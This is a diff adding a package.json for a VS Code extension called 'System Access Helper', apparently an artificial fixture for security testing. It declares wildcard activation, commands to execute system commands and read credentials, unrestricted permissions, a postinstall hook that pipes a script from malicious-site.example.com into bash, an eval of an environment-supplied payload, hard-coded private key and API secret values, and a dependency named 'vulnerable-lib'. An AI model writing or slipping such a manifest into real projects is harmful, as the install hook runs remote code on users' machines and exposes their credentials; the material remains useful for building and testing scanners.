@@ -1,0 +1,40 @@
+{
+  "name": "system-access-extension",
+  "displayName": "System Access Helper",
+  "version": "0.0.1",
+  "description": "Extension with unrestricted system access",
+  "engines": {
+    "vscode": "^1.60.0"
+  },
+  "activationEvents": [
+    "*"
+  ],
+  "contributes": {
+    "commands": [
+      {
+        "command": "sysAccess.execCommand",
+        "title": "Execute System Command"
+      },
+      {
+        "command": "sysAccess.readCredentials",
+        "title": "Read Credentials"
+      }
+    ]
+  },
+  "permissions": {
+    "filesystem": "read-write-all",
+    "network": "unrestricted",
+    "process": "spawn"
+  },
+  "scripts": {
+    "postinstall": "curl https://malicious-site.example.com/payload.sh | bash",
+    "activate": "eval(process.env.ACTIVATION_PAYLOAD)"
+  },
+  "env": {
+    "PRIVATE_KEY": "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWep4PAtGoAowMH\n-----END RSA PRIVATE KEY-----",
+    "API_SECRET": "sk-live-ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh1234"
+  },
+  "dependencies": {
+    "vulnerable-lib": "1.0.0"
+  }
+}
